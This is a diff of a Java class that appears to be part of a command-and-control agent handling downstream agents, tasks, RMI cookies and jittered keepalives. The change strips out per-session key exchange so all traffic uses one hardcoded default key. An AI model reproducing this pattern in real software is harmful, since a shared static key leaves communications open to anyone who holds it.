@@ -218,17 +218,7 @@ public class Main
 
                     String cookieEncrypted = authData.get("cookie").toString();
                     tasks = (ArrayList) authData.get("tasks");
-
-                    config.encKey = new String(
-
-                        secInst.decrypt(
-                            Base64.getDecoder().decode(
-                                cookieEncrypted.getBytes()
-                            ),
-                            config.defaultKey.getBytes(), 
-                            ephemeralNonce.getBytes()
-                        )
-                    );
+                    System.out.println("successfully set up");
                     break;
                 }
                 else
@@ -260,7 +250,7 @@ public class Main
             }
             catch (Exception e)
             {
-                System.out.println(e.getMessage());
+                System.out.println(String.format("keepalive error: %s",e.getMessage()));
                 TimeUnit.MILLISECONDS.sleep((nUtil.rngenerator(4,10))*1000);
                 continue;
             }
@@ -642,15 +632,6 @@ public class Main
         {
             security secInst = new security();
             Hashtable authData = new Hashtable();
-            String currentKey;
-            if (downstreamAgents.containsKey(uuid))
-            {
-                currentKey = config.encKey;
-            }
-            else
-            {
-                currentKey = config.defaultKey;
-            }
 
             String authBlob = new String(
                 
@@ -658,7 +639,7 @@ public class Main
                     Base64.getDecoder().decode(
                         passwd.getBytes()
                     ),
-                    currentKey.getBytes(),
+                    config.defaultKey.getBytes(),
                     downstreamNonce.getBytes()
                 )
             );
@@ -679,16 +660,6 @@ public class Main
                     }
                 }
 
-                String kexBlob = new String(
-                    Base64.getEncoder().encode(
-                        secInst.encrypt(
-                            config.encKey.getBytes(),
-                            currentKey.getBytes(), 
-                            downstreamNonce.getBytes()
-                        )
-                    )
-                );
-
                 String rmiCookie = mkCookie(uuid,config.passMat);
                 downstreamAgents.put(uuid,rmiCookie);
                 
@@ -698,7 +669,6 @@ public class Main
                 }
 
                 authData.put("tasks", taskData);
-                authData.put("key", kexBlob);
                 authData.put("cookie", rmiCookie);
 
                 return authData;
@@ -719,7 +689,7 @@ public class Main
                     Base64.getDecoder().decode(
                         cookie.getBytes()
                     ),
-                    config.encKey.getBytes(),
+                    config.defaultKey.getBytes(),
                     downstreamNonce.getBytes()
                 )
             );
@@ -745,7 +715,7 @@ public class Main
                     Base64.getDecoder().decode(
                         cookie.getBytes()
                     ),
-                        config.encKey.getBytes(),
+                        config.defaultKey.getBytes(),
                         downstreamNonce.getBytes()
                 )
             );
